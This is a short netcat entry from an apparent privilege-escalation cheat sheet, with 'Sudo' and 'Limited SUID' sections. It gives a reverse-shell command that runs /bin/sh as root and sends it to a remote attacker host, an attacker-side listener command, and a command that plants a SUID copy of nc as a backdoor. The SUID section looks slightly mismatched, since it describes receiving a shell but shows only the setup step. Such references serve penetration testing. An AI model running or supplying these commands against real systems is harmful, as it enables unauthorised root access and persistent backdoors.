***** Sudo *****
It runs in privileged context and may be used to access the file system,
escalate or maintain access with elevated privileges if enabled on sudo.
    * Run nc -l -p 12345 on the attacker box to receive the shell. This only
      works with netcat traditional.

      sudo nc -e /bin/sh $RHOST $RPORT
***** Limited SUID *****
It runs with the SUID bit set and may be exploited to access the file system,
escalate or maintain access with elevated privileges working as a SUID
backdoor. If it is used to run commands it only works on systems like Debian
that allow the default sh shell to run with SUID privileges.
    * Run nc -l -p 12345 on the attacker box to receive the shell. This only
      works with netcat traditional.
      sudo sh -c 'cp $(which nc) .; chmod +s ./nc'
